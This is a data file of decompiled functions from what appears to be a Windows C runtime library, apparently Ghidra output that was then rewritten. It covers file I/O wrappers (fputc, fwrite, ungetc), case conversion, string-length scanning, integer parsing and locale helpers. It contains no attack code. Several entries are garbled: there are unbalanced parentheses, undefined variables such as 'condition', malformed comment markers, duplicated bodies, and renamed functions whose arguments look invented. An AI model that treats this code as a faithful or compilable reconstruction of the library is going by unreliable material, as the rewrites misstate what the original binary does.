{"Function Name": "FUN_10027442", "Address": "10027442", "Source Code": "void FUN_10027442(void) \n{\n    FUN_10027304('\\x01'); \n}"}
{"Function Name": "FUN_100275c2", "Address": "100275c2", "Source Code": "void unlock_file_function(void) \n{\n    \n    unlock_file(*(FILE **)(*(int *)0x20)); \n}"}
{"Function Name": "_fputc", "Address": "10027650", "Source Code": "int __cdecl _fputc(int character, FILE *filePointer) \n{\n    uint fileDescriptor; \n    undefined *fileDataPointer; \n    undefined *additionalDataPointer; \n    if (filePointer == (FILE *)0x0) { \n        undefined4 *errorCodePointer = (undefined4 *)FUN_100253b8(); \n        *errorCodePointer = 0x16; \n        FUN_1001de96(); \n    } else {\n        __lock_file(filePointer); \n        if (((uint)filePointer->_flag >> 0xc & 1) != 0) { \n            fileDescriptor = __fputc_nolock((byte)character, filePointer); \n            FUN_1002774c(); \n            return fileDescriptor; \n        }\n        fileDescriptor = __fileno(filePointer); \n        if ((fileDescriptor == 0xffffffff) || (fileDescriptor == 0xfffffffe)) { \n            fileDataPointer = &DAT_1004e2b8; \n        } else {\n            fileDataPointer = (undefined *)((fileDescriptor & 0x3f) * 0x30 + (&DAT_10050088)[(int)fileDescriptor >> 6]); \n        }\n        additionalDataPointer = &DAT_1004e2b8; \n        if (fileDataPointer[0x29] == '\\0') { \n            if ((fileDescriptor != 0xffffffff) && (fileDescriptor != 0xfffffffe)) { \n                additionalDataPointer = (undefined *)((fileDescriptor & 0x3f) * 0x30 + (&DAT_10050088)[(int)fileDescriptor >> 6]); \n            }\n            if ((additionalDataPointer[0x2d] & 1) == 0) { \n                fileDescriptor = __fputc_nolock((byte)character, filePointer); \n                FUN_1002774c(); \n                return fileDescriptor; \n            }\n        }\n        undefined4 *errorCodePointer = (undefined4 *)FUN_100253b8(); \n        *errorCodePointer = 0x16; \n        FUN_1001de96(); \n        __local_unwind4(&DAT_1004e008, 0xfffffffe); \n    }\n    return -1; \n}"}
{"Function Name": "FUN_1002774c", "Address": "1002774c", "Source Code": "void unlockFileFunction(void) \n{\n    unlockFile(NULL); \n}"}
{"Function Name": "FUN_100279d6", "Address": "100279d6", "Source Code": "void unlockFileFunction(void) \n{\n    unlockFile(NULL); \n}"}
{"Function Name": "FUN_10027b17", "Address": "10027b17", "Source Code": "void unlock_file_function(void) \n{\n    \n    unlock_file(*(FILE **)(*(int *)0 + 8));\n}"}
{"Function Name": "__crt_seh_guarded_call<unsigned_int>::operator()<class_<lambda_11b4f7b0d3157825a5656a18eba1ae27>,class_<lambda_b51c0495177f500e782686251704ae76>&,class_<lambda_cf89b47920b5017557bfe891e78aca36>_>", "Address": "10027cee", "Source Code": "\\*\nuint __thiscall\n__crt_seh_guarded_call<unsigned_int>::\noperator()<class_<lambda_11b4f7b0d3157825a5656a18eba1ae27>,class_<lambda_b51c0495177f500e782686251704ae76>&,class_<lambda_cf89b47920b5017557bfe891e78aca36>_>\n(__crt_seh_guarded_call<unsigned_int> *this, \n<lambda_11b4f7b0d3157825a5656a18eba1ae27> *param_1, \n<lambda_b51c0495177f500e782686251704ae76> *param_2, \n<lambda_cf89b47920b5017557bfe891e78aca36> *param_3) \n{\n    __lock_file(*(FILE **)param_1); \n    return <lambda_b51c0495177f500e782686251704ae76>::operator()(param_2); \n}\n*\\ \n \nuint __thiscall\n__crt_seh_guarded_call<unsigned_int>::\noperator()<class_<lambda_11b4f7b0d3157825a5656a18eba1ae27>,class_<lambda_b51c0495177f500e782686251704ae76>&,class_<lambda_cf89b47920b5017557bfe891e78aca36>_>\n(__crt_seh_guarded_call<unsigned_int> *this,\n<lambda_11b4f7b0d3157825a5656a18eba1ae27> *param_1,\n<lambda_b51c0495177f500e782686251704ae76> *param_2,\n<lambda_cf89b47920b5017557bfe891e78aca36> *param_3)\n{\n    __lock_file(*(FILE **)param_1);\n    return <lambda_b51c0495177f500e782686251704ae76>::operator()(param_2);\n}"}
{"Function Name": "FUN_10027d33", "Address": "10027d33", "Source Code": "void unlockFileFunction(void) \n{\n    \n    unlockFile(**(FILE ***)(*(int *)0x10)); \n}"}
{"Function Name": "<lambda_b51c0495177f500e782686251704ae76>::operator()", "Address": "10027d67", "Source Code": "uint __thiscall\n<lambda_b51c0495177f500e782686251704ae76>::operator()\n(<lambda_b51c0495177f500e782686251704ae76> *this)\n{\n    \n    FILE *pFVar1 = **(FILE ***)this;\n    \n    uint uVar2 = ___acrt_stdio_begin_temporary_buffering_nolock(pFVar1);\n    \n    uint uVar3 = FUN_10027dad((undefined8 *)**(undefined4 **)(this + 4), \n                               **(uint **)(this + 8), \n                               **(uint **)(this + 0xc), \n                               pFVar1);\n    \n    ___acrt_stdio_end_temporary_buffering_nolock((char)uVar2, pFVar1);\n    \n    return uVar3;\n}"}
{"Function Name": "_fwrite", "Address": "10027f26", "Source Code": "size_t __cdecl _fwrite(void *buffer, size_t element_size, size_t element_count, FILE *file_pointer)\n{\n    \n    if ((element_size != 0) && (element_count != 0)) {\n        \n        if (file_pointer != (FILE *)0x0) {\n            \n            return __acrt_lock_stream_and_call<class_<lambda_b51c0495177f500e782686251704ae76>>(file_pointer, (<lambda_b51c0495177f500e782686251704ae76> *)&file_pointer);\n        }\n        \n        undefined4 *error_code_pointer = (undefined4 *)FUN_100253b8();\n        *error_code_pointer = 0x16; \n        FUN_1001de96(); \n    }\n    \n    return 0;\n}"}
{"Function Name": "__crt_seh_guarded_call<int>::operator()<class_<lambda_d92cfe8357b99225085016881b624cb0>,class_<lambda_b721fa326cdb32351d23dfa67958c160>&,class_<lambda_42d75b0848218ec137fa420c8ba9fdf9>_>", "Address": "10027f7e", "Source Code": "\\*\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_d92cfe8357b99225085016881b624cb0>,class_<lambda_b721fa326cdb32351d23dfa67958c160>&,class_<lambda_42d75b0848218ec137fa420c8ba9fdf9>_>\n(__crt_seh_guarded_call<int> *this, \n<lambda_d92cfe8357b99225085016881b624cb0> *param_1, \n<lambda_b721fa326cdb32351d23dfa67958c160> *param_2, \n<lambda_42d75b0848218ec137fa420c8ba9fdf9> *param_3) \n{\n    \n    __lock_file(*(FILE **)param_1);\n    \n    \n    return <lambda_b721fa326cdb32351d23dfa67958c160>::operator()(param_2);\n}\n*\\ \n \nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_d92cfe8357b99225085016881b624cb0>,class_<lambda_b721fa326cdb32351d23dfa67958c160>&,class_<lambda_42d75b0848218ec137fa420c8ba9fdf9>_>\n(__crt_seh_guarded_call<int> *this,<lambda_d92cfe8357b99225085016881b624cb0> *param_1,\n<lambda_b721fa326cdb32351d23dfa67958c160> *param_2,\n<lambda_42d75b0848218ec137fa420c8ba9fdf9> *param_3)\n{\n    __lock_file(*(FILE **)param_1);\n    return <lambda_b721fa326cdb32351d23dfa67958c160>::operator()(param_2);\n}"}
{"Function Name": "FUN_10027fc3", "Address": "10027fc3", "Source Code": "void unlockFileFunction(void) \n{\n    \n    unlockFile(**(FILE ***)(*(int *)0x10))); \n}"}
{"Function Name": "<lambda_b721fa326cdb32351d23dfa67958c160>::operator()", "Address": "10027ff7", "Source Code": "int __thiscall\n<lambda_b721fa326cdb32351d23dfa67958c160>::operator()\n(<lambda_b721fa326cdb32351d23dfa67958c160> *this)\n{\n    \n    uint uVar3 = **(uint **)this & 0xfffffffe;\n    \n    ___acrt_stdio_flush_nolock(**(FILE ***)(this + 4));\n    \n    ___acrt_stdio_free_buffer_nolock((undefined4 *)**(undefined4 **)(this + 4));\n    \n    LOCK();\n    \n    *(uint *)(**(int **)(this + 4) + 0xc) &= 0xfffff81f;\n    \n    UNLOCK();\n    uint uVar5; \n    LPVOID pvVar1; \n    undefined4 *puVar4 = (undefined4 *)**(undefined4 **)(this + 4); \n    \n    if ((**(byte **)(this + 8) & 4) == 0) {\n        \n        pvVar1 = **(LPVOID **)(this + 0xc);\n        \n        \n        if (pvVar1 == (LPVOID)0x0) {\n            pvVar1 = __malloc_base(uVar3); \n            FID_conflict__free((void *)0x0); \n            \n            \n            if (pvVar1 == (LPVOID)0x0) {\n                _DAT_1005006c++; \n                return -1; \n            }\n            uVar5 = 0x140; \n        } else {\n            uVar5 = 0x180; \n        }\n    } else {\n        \n        uVar5 = 0x400; \n        uVar3 = 2; \n        pvVar1 = (LPVOID)(**(int **)(this + 4) + 0x14); \n    }\n    \n    \n    return set_buffer(puVar4, pvVar1, uVar3, uVar5);\n}"}
{"Function Name": "_ungetc", "Address": "10028229", "Source Code": "int __cdecl _ungetc(int character, FILE *filePointer)\n{\n    uint returnValue; \n    \n    if (filePointer == (FILE *)0x0) {\n        *(undefined4 *)FUN_100253b8() = 0x16; \n        FUN_1001de96(); \n        returnValue = 0xffffffff; \n    } else {\n        __lock_file(filePointer); \n        returnValue = FUN_1002813a(character, filePointer); \n        FUN_10028291(); \n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_10028291", "Address": "10028291", "Source Code": "void unlockFileFunction(void) \n{\n    unlockFile(NULL); \n}"}
{"Function Name": "common_tox_l<&bool___cdecl_internal_isupper_l(int,struct___crt_locale_pointers*_const),&int___cdecl_internal_map_lower(int,struct___crt_locale_pointers*_const)>", "Address": "10028588", "Source Code": "\\*\nint __cdecl\ncommon_tox_l<&bool___cdecl_internal_isupper_l(int,struct___crt_locale_pointers*_const),&int___cdecl_internal_map_lower(int,struct___crt_locale_pointers*_const)>\n(int param_1, ulong param_2, __crt_locale_pointers *param_3)\n{\n    int iVar3; \n    undefined4 *puVar4; \n    int local_20; \n    localeinfo_struct local_1c; \n    ushort local_8; \n    char local_c; \n    \n    FUN_1001bfff(&local_20, (__acrt_ptd **)param_3);\n    \n    \n    if ((uint)param_1 < 0x100) {\n        \n        if (internal_isupper_l(param_1, (__crt_locale_pointers *)&local_1c)) {\n            \n            return (uint)(local_1c.locinfo->pclmap[param_1]);\n        }\n        return param_1; \n    }\n    \n    local_8 = 0; \n    \n    \n    if (1 < (int)(local_1c.locinfo)->lc_codepage) {\n        \n        if (__isleadbyte_l((param_1 >> 8) & 0xff, &local_1c) != 0) {\n            local_8 = (ushort)param_1; \n            iVar3 = 2; \n            goto LAB_10028648; \n        }\n    }\n    \n    \n    puVar4 = (undefined4 *)FUN_100253b8();\n    *puVar4 = 0x2a; \n    iVar3 = 1; \n    local_8 = (ushort)(byte)param_1; \n    \nLAB_10028648:\n    local_c = 0; \n    \n    \n    iVar3 = ___acrt_LCMapStringA((__acrt_ptd **)&local_1c, local_1c.locinfo->locale_name[2], param_2, (char *)&local_8, iVar3, (char *)&local_c, 3, (local_1c.locinfo)->lc_collate_cp, 1);\n    \n    \n    if (iVar3 == 0) {\n        return param_1; \n    } else if (iVar3 == 1) {\n        return (int)(byte)local_c; \n    } else {\n        return (int)CONCAT11((byte)local_c, local_c._1_1_); \n    }\n}\n*\\ \n \nint __cdecl\ncommon_tox_l<&bool___cdecl_internal_isupper_l(int,struct___crt_locale_pointers*_const),&int___cdecl_internal_map_lower(int,struct___crt_locale_pointers*_const)>\n(int param_1, ulong param_2, __crt_locale_pointers *param_3)\n{\n    int iVar3;\n    undefined4 *puVar4;\n    int local_20;\n    localeinfo_struct local_1c;\n    ushort local_8;\n    char local_c;\n    FUN_1001bfff(&local_20, (__acrt_ptd **)param_3);\n    if ((uint)param_1 < 0x100) {\n        if (internal_isupper_l(param_1, (__crt_locale_pointers *)&local_1c)) {\n            return (uint)(local_1c.locinfo->pclmap[param_1]);\n        }\n        return param_1;\n    }\n    local_8 = 0;\n    if (1 < (int)(local_1c.locinfo)->lc_codepage) {\n        if (__isleadbyte_l((param_1 >> 8) & 0xff, &local_1c) != 0) {\n            local_8 = (ushort)param_1;\n            iVar3 = 2;\n            goto LAB_10028648;\n        }\n    }\n    puVar4 = (undefined4 *)FUN_100253b8();\n    *puVar4 = 0x2a;\n    iVar3 = 1;\n    local_8 = (ushort)(byte)param_1;\nLAB_10028648:\n    local_c = 0;\n    iVar3 = ___acrt_LCMapStringA((__acrt_ptd **)&local_1c, local_1c.locinfo->locale_name[2], param_2, (char *)&local_8, iVar3, (char *)&local_c, 3, (local_1c.locinfo)->lc_collate_cp, 1);\n    if (iVar3 == 0) {\n        return param_1;\n    } else if (iVar3 == 1) {\n        return (int)(byte)local_c;\n    } else {\n        return (int)CONCAT11((byte)local_c, local_c._1_1_);\n    }\n}"}
{"Function Name": "__tolower_l", "Address": "100286ef", "Source Code": "int __cdecl __tolower_l(int character, _locale_t locale)\n{\n    \n    \n    \n    \n    return common_tox_l<&bool___cdecl_internal_isupper_l(int,struct___crt_locale_pointers*_const),&int___cdecl_internal_map_lower(int,struct___crt_locale_pointers*_const)>(character, 0x100, (__crt_locale_pointers *)locale);\n}"}
{"Function Name": "_tolower", "Address": "10028709", "Source Code": "int __cdecl _tolower(int character) \n{\n    \n    if (condition == 0 && character >= 0x41 && character <= 0x5A) {\n        character += 0x20; \n    } else {\n        \n        character = __tolower_l(character, (_locale_t)0x0);\n    }\n    return character; \n}"}
{"Function Name": "FUN_10028739", "Address": "10028739", "Source Code": "uint __cdecl FUN_10028739(char *input_string, uint max_length) {\n    char *current_char_ptr; \n    uint processed_length;   \n    uint max_process_length;   \n    \n    if (global_threshold < 5) {\n        \n        if (global_threshold < 1) {\n            current_char_ptr = input_string; \n            \n            if (input_string != input_string + max_length) {\n                do {\n                    if (*current_char_ptr == '\\0') break; \n                    current_char_ptr++; \n                } while (current_char_ptr != input_string + max_length); \n            }\n            processed_length = (int)current_char_ptr - (int)input_string; \n        } else {\n            \n            max_process_length = -(uint)(((uint)input_string & 0xf) != 0) & 0x10 - ((uint)input_string & 0xf);\n            \n            if (max_length < max_process_length) {\n                max_process_length = max_length;\n            }\n            current_char_ptr = input_string; \n            \n            if (input_string != input_string + max_process_length) {\n                do {\n                    if (*current_char_ptr == '\\0') break; \n                    current_char_ptr++; \n                } while (current_char_ptr != input_string + max_process_length); \n            }\n            processed_length = (int)current_char_ptr - (int)input_string; \n            \n            if (processed_length == max_process_length) {\n                current_char_ptr += processed_length; \n                char null_marker_array[16]; \n                undefined unused_alignment_array[64]; \n                \n                for (char *end_char_ptr = current_char_ptr + ((max_length - max_process_length) - (max_length - max_process_length & 0xf)); current_char_ptr != end_char_ptr; current_char_ptr += 0x10) {\n                    for (int i = 0; i < 16; i++) {\n                        null_marker_array[i] = -(current_char_ptr[i] == '\\0'); \n                    }\n                    \n                    if ((ushort)((ushort)(SUB161(null_marker_array >> 7, 0) & 1) |\n                        (ushort)(SUB161(null_marker_array >> 0xf, 0) & 1) << 1 |\n                        (ushort)(SUB161(null_marker_array >> 0x17, 0) & 1) << 2 |\n                        (ushort)(SUB161(null_marker_array >> 0x1f, 0) & 1) << 3 |\n                        (ushort)(SUB161(null_marker_array >> 0x27, 0) & 1) << 4 |\n                        (ushort)(SUB161(null_marker_array >> 0x2f, 0) & 1) << 5 |\n                        (ushort)(SUB161(null_marker_array >> 0x37, 0) & 1) << 6 |\n                        (ushort)(SUB161(null_marker_array >> 0x3f, 0) & 1) << 7 |\n                        (ushort)(SUB161(null_marker_array >> 0x47, 0) & 1) << 8 |\n                        (ushort)(SUB161(null_marker_array >> 0x4f, 0) & 1) << 9 |\n                        (ushort)(SUB161(null_marker_array >> 0x57, 0) & 1) << 10 |\n                        (ushort)(SUB161(null_marker_array >> 0x5f, 0) & 1) << 0xb |\n                        (ushort)(SUB161(null_marker_array >> 0x67, 0) & 1) << 0xc |\n                        (ushort)(SUB161(null_marker_array >> 0x6f, 0) & 1) << 0xd |\n                        (ushort)(SUB161(null_marker_array >> 0x77, 0) & 1) << 0xe |\n                        (ushort)(null_marker_array[0xf] >> 7) << 0xf) != 0) break; \n                }\n                \n                for (; (current_char_ptr != input_string + max_length && (*current_char_ptr != '\\0')); current_char_ptr++) {}\n                processed_length = (int)current_char_ptr - (int)input_string; \n            }\n        }\n    } else {\n        \n        max_process_length = -(uint)(((uint)input_string & 0x1f) != 0) & 0x20 - ((uint)input_string & 0x1f);\n        \n        if (max_length < max_process_length) {\n            max_process_length = max_length;\n        }\n        current_char_ptr = input_string; \n        \n        if (input_string != input_string + max_process_length) {\n            do {\n                if (*current_char_ptr == '\\0') break; \n                current_char_ptr++; \n            } while (current_char_ptr != input_string + max_process_length); \n        }\n        processed_length = (int)current_char_ptr - (int)input_string; \n        \n        if (processed_length == max_process_length) {\n            undefined (*next_block_ptr)[32] = (undefined (*)[32])(input_string + processed_length); \n            undefined (*end_block_ptr)[32] = (undefined (*)[32])(((max_length - max_process_length) - (max_length - max_process_length & 0x1f)) + (int)next_block_ptr); \n            \n            while ((next_block_ptr != end_block_ptr && (comparison_result = vpcmpeqb_avx2(ZEXT832(0) << 0x40, *next_block_ptr),\n                ((uint)(SUB321(comparison_result >> 7, 0) & 1) | (uint)(SUB321(comparison_result >> 0xf, 0) & 1) << 1 |\n                (uint)(SUB321(comparison_result >> 0x17, 0) & 1) << 2 | (uint)(SUB321(comparison_result >> 0x1f, 0) & 1) << 3 |\n                (uint)(SUB321(comparison_result >> 0x27, 0) & 1) << 4 | (uint)(SUB321(comparison_result >> 0x2f, 0) & 1) << 5 |\n                (uint)(SUB321(comparison_result >> 0x37, 0) & 1) << 6 | (uint)(SUB321(comparison_result >> 0x3f, 0) & 1) << 7 |\n                (uint)(SUB321(comparison_result >> 0x47, 0) & 1) << 8 | (uint)(SUB321(comparison_result >> 0x4f, 0) & 1) << 9 |\n                (uint)(SUB321(comparison_result >> 0x57, 0) & 1) << 10 | (uint)(SUB321(comparison_result >> 0x5f, 0) & 1) << 0xb |\n                (uint)(SUB321(comparison_result >> 0x67, 0) & 1) << 0xc | (uint)(SUB321(comparison_result >> 0x6f, 0) & 1) << 0xd |\n                (uint)(SUB321(comparison_result >> 0x77, 0) & 1) << 0xe | (uint)SUB321(comparison_result >> 0x7f, 0) << 0xf |\n                (uint)(SUB321(comparison_result >> 0x87, 0) & 1) << 0x10 | (uint)(SUB321(comparison_result >> 0x8f, 0) & 1) << 0x11 |\n                (uint)(SUB321(comparison_result >> 0x97, 0) & 1) << 0x12 | (uint)(SUB321(comparison_result >> 0x9f, 0) & 1) << 0x13 |\n                (uint)(SUB321(comparison_result >> 0xa7, 0) & 1) << 0x14 | (uint)(SUB321(comparison_result >> 0xaf, 0) & 1) << 0x15 |\n                (uint)(SUB321(comparison_result >> 0xb7, 0) & 1) << 0x16 | (uint)SUB321(comparison_result >> 0xbf, 0) << 0x17 |\n                (uint)(SUB321(comparison_result >> 0xc7, 0) & 1) << 0x18 | (uint)(SUB321(comparison_result >> 0xcf, 0) & 1) << 0x19 |\n                (uint)(SUB321(comparison_result >> 0xd7, 0) & 1) << 0x1a | (uint)(SUB321(comparison_result >> 0xdf, 0) & 1) << 0x1b |\n                (uint)(SUB321(comparison_result >> 0xe7, 0) & 1) << 0x1c | (uint)(SUB321(comparison_result >> 0xef, 0) & 1) << 0x1d |\n                (uint)(SUB321(comparison_result >> 0xf7, 0) & 1) << 0x1e | (uint)(byte)(comparison_result[0x1f] >> 7) << 0x1f) == 0))) {\n                next_block_ptr++; \n            }\n            \n            for (; (next_block_ptr != (undefined (*)[32])(input_string + max_length) && ((*next_block_ptr)[0] != '\\0')); next_block_ptr = (undefined (*)[32])(*next_block_ptr + 1)) {}\n            processed_length = (int)next_block_ptr - (int)input_string; \n        }\n    }\n    return processed_length; \n}"}
{"Function Name": "_strtol", "Address": "10028bb0", "Source Code": "long __cdecl _strtol(char *input_string, char **end_pointer, int _Radix)\n{\n    ulong parsed_value; \n    \n    make_c_string_character_source<>((undefined4 *)&stack_memory, input_string, end_pointer);\n    \n    parsed_value = __crt_strtox::parse_integer<unsigned_long, class___crt_strtox::c_string_character_source<char>>((__acrt_ptd **)0x0, nullptr, nullptr, _Radix, '\\x01');\n    return parsed_value; \n}"}
{"Function Name": "_wcstol", "Address": "10028bdc", "Source Code": "long __cdecl _wcstol(wchar_t *wideCharString, wchar_t **endPointer, int base)\n{\n    ulong convertedValue; \n    char defaultParseBehavior = '\\x01'; \n    \n    make_c_string_character_source<>((undefined4 *)&stack0xffffffe8, wideCharString, endPointer);\n    \n    convertedValue = __crt_strtox::parse_integer<unsigned_long, class___crt_strtox::c_string_character_source<wchar_t>_>((__acrt_ptd **)0x0, endPointer, endPointer, base, defaultParseBehavior);\n    \n    return convertedValue; \n}"}
{"Function Name": "FUN_10028ec2", "Address": "10028ec2", "Source Code": "void unlock_function(void) \n{\n    \n    \n    \n    \n    unlock_function_call(**(int **)(*(int *)0x10));\n}"}
{"Function Name": "FUN_10028f23", "Address": "10028f23", "Source Code": "void unlock_function(void) \n{\n    \n    \n    \n    unlock_function_call(**(int **)(*(int *)0x10)); \n}"}
{"Function Name": "FUN_10028f6e", "Address": "10028f6e", "Source Code": "void unlock_function(void) \n{\n    \n    \n    \n    unlock_function(**(int **)(*(int *)0x10));\n}"}
{"Function Name": "FUN_10028fbe", "Address": "10028fbe", "Source Code": "void unlock_function(void) \n{\n    \n    \n    \n    ___acrt_unlock(**(int **)(*(int *)0x10));\n}"}
{"Function Name": "___acrt_uninitialize_ptd", "Address": "10029451", "Source Code": "undefined4 ___acrt_uninitialize_ptd(void)\n{\n    \n    if (thread_local_storage_id != 0xffffffff) {\n        \n        free_thread_local_storage(thread_local_storage_id);\n        \n        thread_local_storage_id = 0xffffffff;\n    }\n    \n    return 1;\n}"}
{"Function Name": "FUN_100294c5", "Address": "100294c5", "Source Code": "undefined4 __cdecl FUN_100294c5(uint *input_array)\n{\n    uint second_element = input_array[1]; \n    \n    if ((second_element >> 0x14 & 0x7ff) == 0x7ff) {\n        \n        \n        if ((*input_array | second_element & 0xfffff) == 0) {\n            return 1; \n        }\n        \n        else if ((second_element & 0x80000000) == 0 && *input_array == 0 && (second_element & 0xfffff) == 0x80000) {\n            return 4; \n        }\n        \n        else if ((second_element & 0x80000) == 0) {\n            return 3; \n        }\n        else {\n            return 2; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "fp_format_f_internal", "Address": "10029ad2", "Source Code": "int __cdecl\nfp_format_f_internal\n(char *param_1, uint param_2, int param_3, _strflt *param_4, bool param_5,\n__crt_locale_pointers *param_6)\n{\n    char *pcVar2; \n    int local_14; \n    FUN_1001bfff(&local_14, (__acrt_ptd **)param_6); \n    \n    if ((param_5) && (*(int *)(param_4 + 4) + -1 == param_3)) {\n        \n        *(undefined2 *)(param_1 + (uint)(*(int *)param_4 == 0x2d) + *(int *)(param_4 + 4) + -1) = 0x30;\n    }\n    pcVar2 = param_1; \n    \n    if (*(int *)param_4 == 0x2d) {\n        *param_1 = '-'; \n        pcVar2 = param_1 + 1; \n    }\n    \n    if (*(int *)(param_4 + 4) < 1) {\n        shift_bytes(param_1, param_2, pcVar2, 1); \n        *pcVar2 = '0'; \n        pcVar2++; \n    } else {\n        pcVar2 += *(int *)(param_4 + 4); \n    }\n    \n    if (0 < param_3) {\n        shift_bytes(param_1, param_2, pcVar2, 1); \n        *pcVar2 = ***(char ***)(local_14 + 0x88); \n        int iVar1 = *(int *)(param_4 + 4); \n        \n        if (iVar1 < 0) {\n            \n            if ((param_5) || (-iVar1 < param_3)) {\n                param_3 = -iVar1; \n            }\n            shift_bytes(param_1, param_2, pcVar2 + 1, param_3); \n            _memset(pcVar2 + 1, 0x30, param_3); \n        }\n    }\n    return 0; \n}"}
{"Function Name": "__get_printf_count_output", "Address": "10029f0d", "Source Code": "int __cdecl __get_printf_count_output(void)\n{\n    \n    \n    return (uint)(outputCount == (flagValue | 1));\n}"}
{"Function Name": "FUN_1002a047", "Address": "1002a047", "Source Code": "void unlock_function(void)\n{\n    \n    \n    \n    unlock_function_call(**(int **)(*(int *)0x10));\n}"}
{"Function Name": "__crt_seh_guarded_call<void>::operator()<class_<lambda_135d2772fca65dc1248eeaa1b56e886a>,class_<lambda_2a444430fde8c29194d880d93eed5e8f>&,class_<lambda_8dff2cf36a5417162780cd64fa2883ef>&>", "Address": "1002a053", "Source Code": "\\*\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_135d2772fca65dc1248eeaa1b56e886a>,class_<lambda_2a444430fde8c29194d880d93eed5e8f>&,class_<lambda_8dff2cf36a5417162780cd64fa2883ef>&>\n(__crt_seh_guarded_call<void> *this, \n<lambda_135d2772fca65dc1248eeaa1b56e886a> *param_1, \n<lambda_2a444430fde8c29194d880d93eed5e8f> *param_2, \n<lambda_8dff2cf36a5417162780cd64fa2883ef> *param_3) \n{\n    \n    param_2->operator()();\n    \n    \n    FUN_1002a07f();\n}\n*\\ \n \nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_135d2772fca65dc1248eeaa1b56e886a>,class_<lambda_2a444430fde8c29194d880d93eed5e8f>&,class_<lambda_8dff2cf36a5417162780cd64fa2883ef>&>\n(__crt_seh_guarded_call<void> *this,<lambda_135d2772fca65dc1248eeaa1b56e886a> *param_1,\n<lambda_2a444430fde8c29194d880d93eed5e8f> *param_2,\n<lambda_8dff2cf36a5417162780cd64fa2883ef> *param_3)\n{\n    param_2->operator()();\n    FUN_1002a07f();\n}"}
{"Function Name": "FUN_1002a07f", "Address": "1002a07f", "Source Code": "void FUN_1002a07f(void)\n{\n    \n    \n    \n    \n    \n    \n    \n    *(uint **)(*(int ***)base_pointer + 0x10) + 0x350) &= 0xffffffef;\n}"}
{"Function Name": "FUN_1002a08e", "Address": "1002a08e", "Source Code": "void FUN_1002a08e(int *lock_value)\n{\n    \n    ___acrt_lock(*lock_value);\n    \n    \n    FUN_1002a127((void **)&data_pointer);\n    \n    \n    FUN_1002a0cb();\n}"}
{"Function Name": "FUN_1002a0cb", "Address": "1002a0cb", "Source Code": "void unlock_resource(void) \n{\n    \n    \n    \n    unlock_function(**(int **)(*(int *)0x10)); \n}"}
{"Function Name": "<lambda_e378711a6f6581bf7f0efd7cdf97f5d9>::operator()", "Address": "1002a156", "Source Code": "void __thiscall\n<lambda_e378711a6f6581bf7f0efd7cdf97f5d9>::operator()\n(<lambda_e378711a6f6581bf7f0efd7cdf97f5d9> *this)\n{\n    int iVar2; \n    ushort *puVar3; \n    uint uVar4; \n    ushort *puVar5; \n    bool bVar6; \n    \n    __copytlocinfo_nolock((undefined4 *)**(undefined4 **)this, *(undefined4 **)(**(int **)(this + 4) + 0x4c));\n    \n    \n    iVar2 = __wsetlocale_nolock(**(int **)this, **(int **)(this + 0xc), **(wchar_t ***)(this + 0x10));\n    **(int **)(this + 8) = iVar2; \n    \n    if (iVar2 == 0) {\n        \n        ___acrt_release_locale_ref(**(int **)this);\n        ___acrt_free_locale(**(void ***)this);\n    } else {\n        \n        puVar3 = **(ushort ***)(this + 0x10);\n        if (puVar3 != (ushort *)0x0) { \n            puVar5 = &DAT_1004e2b0; \n            do {\n                \n                if (*puVar3 != *puVar5) {\n                    uVar4 = -(uint)(*puVar3 < *puVar5) | 1; \n                    goto update_locale; \n                }\n                if (*puVar3 == 0) break; \n                if (puVar3[1] != puVar5[1]) {\n                    uVar4 = -(uint)(puVar3[1] < puVar5[1]) | 1; \n                    goto update_locale; \n                }\n                puVar3 += 2; \n                puVar5 += 2; \n            } while (puVar3[1] != 0); \n            uVar4 = 0; \n        }\n    update_locale:\n        \n        if (uVar4 != 0) {\n            LOCK(); \n            DAT_1005007c = 1; \n            UNLOCK(); \n        }\n    }\n    \n    \n    __updatetlocinfoEx_nolock((void **)(**(int **)(this + 4) + 0x4c), (undefined **)**(undefined4 **)this);\n    \n    \n    ___acrt_release_locale_ref(**(int **)this);\n    \n    \n    if (((*(byte *)(**(int **)(this + 4) + 0x350) & 2) == 0) && (((byte)DAT_1004e808 & 1) == 0)) {\n        \n        __updatetlocinfoEx_nolock(&DAT_10050080, *(undefined ***)(**(int **)(this + 4) + 0x4c));\n        PTR_PTR_DAT_1004e108 = (undefined *)DAT_10050080[0x22]; \n        PTR_DAT_1004e118 = (undefined *)*DAT_10050080; \n        _DAT_1004e1e8 = DAT_10050080[1]; \n    }\n}"}
{"Function Name": "<lambda_2af78c5f5901b1372d98f9ab3177dfa6>::operator()", "Address": "1002a254", "Source Code": "void __thiscall\n<lambda_2af78c5f5901b1372d98f9ab3177dfa6>::operator()\n(<lambda_2af78c5f5901b1372d98f9ab3177dfa6> *this)\n{\n    LPVOID pvVar1; \n    pvVar1 = __calloc_base(1, 0xb8); \n    **(LPVOID **)this = pvVar1; \n    FID_conflict__free((void *)0x0); \n    if (pvVar1 != (LPVOID)0x0) { \n        __acrt_lock_and_call<class_<lambda_e378711a6f6581bf7f0efd7cdf97f5d9>>(4, \n        (<lambda_e378711a6f6581bf7f0efd7cdf97f5d9> *)this); \n    }\n    return; \n}"}
{"Function Name": "FUN_1002a316", "Address": "1002a316", "Source Code": "undefined4 FUN_1002a316(void)\n{\n    \n    undefined4 currentValue = sharedResource;\n    \n    LOCK();\n    \n    sharedResource = 1;\n    \n    UNLOCK();\n    \n    return currentValue;\n}"}
{"Function Name": "FUN_1002a321", "Address": "1002a321", "Source Code": "void lockAndCallFunction(void) \n{\n    lockAndCall<>(4); \n}"}
